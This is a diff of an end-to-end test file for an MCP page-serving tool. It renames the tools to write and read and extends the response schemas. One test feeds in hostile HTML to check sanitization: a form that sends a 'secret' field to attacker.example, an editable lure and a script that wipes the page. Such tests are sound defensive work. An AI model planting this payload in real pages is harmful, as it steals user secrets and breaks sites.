@@ -7,12 +7,14 @@ import {
 } from '@modelcontextprotocol/sdk/client/stdio.js';
 import { z } from 'zod';
 
-const apiUrl = 'http://127.0.0.1:8787';
-const webUrl = 'http://127.0.0.1:8788';
+const apiUrl = process.env.E2E_API_URL ?? 'http://127.0.0.1:8787';
+const webUrl = process.env.E2E_WEB_URL ?? 'http://127.0.0.1:8788';
 
 const createdPageSchema = z.object({
   structuredContent: z.object({
     page_id: z.string().regex(/^[a-f0-9]{32}$/),
+    type: z.enum(['interactive', 'document']),
+    durable: z.literal(false),
     url: z.string().url(),
     expires_at: z.number(),
   }),
@@ -21,9 +23,9 @@ const createdPageSchema = z.object({
 const resultSchema = z.object({
   structuredContent: z.object({
     page_id: z.string(),
+    type: z.enum(['interactive', 'document']),
     state: z.enum(['open', 'submitted', 'received']),
-    format: z.enum(['a2ui', 'html']),
-    result: z.unknown().nullable(),
+    response: z.unknown().nullable(),
   }),
 });
 
@@ -170,7 +172,7 @@ test('generated text stays within a 320px viewport for long identifiers and CJK 
   const client = await connectStdioClient();
   try {
     const created = createdPageSchema.parse(
-      await client.callTool({ name: 'show_ui', arguments: { spec } }),
+      await client.callTool({ name: 'write', arguments: { type: 'interactive', spec } }),
     );
     await page.setViewportSize({ width: 320, height: 720 });
     await page.goto(created.structuredContent.url);
@@ -236,7 +238,7 @@ test('generated tabs and modal fit a 320px viewport', async ({ page }) => {
   const client = await connectStdioClient();
   try {
     const created = createdPageSchema.parse(
-      await client.callTool({ name: 'show_ui', arguments: { spec } }),
+      await client.callTool({ name: 'write', arguments: { type: 'interactive', spec } }),
     );
     await page.setViewportSize({ width: 320, height: 720 });
     await page.goto(created.structuredContent.url);
@@ -274,7 +276,10 @@ test('stdio MCP creates a page, the browser submits it, and the agent receives i
   const client = await connectStdioClient();
   try {
     const created = createdPageSchema.parse(
-      await client.callTool({ name: 'show_ui', arguments: { spec: testSpec } }),
+      await client.callTool({
+        name: 'write',
+        arguments: { type: 'interactive', spec: testSpec },
+      }),
     );
     expect(created.structuredContent.url).toBe(`${webUrl}/${created.structuredContent.page_id}`);
 
@@ -303,14 +308,14 @@ test('stdio MCP creates a page, the browser submits it, and the agent receives i
 
     const result = resultSchema.parse(
       await client.callTool({
-        name: 'check_result',
-        arguments: { page_id: created.structuredContent.page_id },
+        name: 'read',
+        arguments: { page_id: created.structuredContent.page_id, include: 'response' },
       }),
     );
     expect(result.structuredContent).toMatchObject({
       state: 'submitted',
-      format: 'a2ui',
-      result: {
+      type: 'interactive',
+      response: {
         name: 'submitted',
         surfaceId: 'e2e',
         context: { name: 'Ada', project: 'A reliable agent UI' },
@@ -334,8 +339,9 @@ test('stdio MCP serves a sanitized view-only HTML page', async ({ page }) => {
   try {
     const created = createdPageSchema.parse(
       await client.callTool({
-        name: 'show_html',
+        name: 'write',
         arguments: {
+          type: 'document',
           html: '<main><h1>Live production view</h1><form action="https://attacker.example/collect"><label>Secret <input name="secret"></label><button>Send</button></form><div contenteditable="true">Editable lure</div><script>document.body.remove()</script></main>',
         },
       }),
@@ -354,14 +360,14 @@ test('stdio MCP serves a sanitized view-only HTML page', async ({ page }) => {
 
     const result = resultSchema.parse(
       await client.callTool({
-        name: 'check_result',
-        arguments: { page_id: created.structuredContent.page_id },
+        name: 'read',
+        arguments: { page_id: created.structuredContent.page_id, include: 'response' },
       }),
     );
     expect(result.structuredContent).toMatchObject({
       state: 'open',
-      format: 'html',
-      result: null,
+      type: 'document',
+      response: null,
     });
   } finally {
     await client.close();
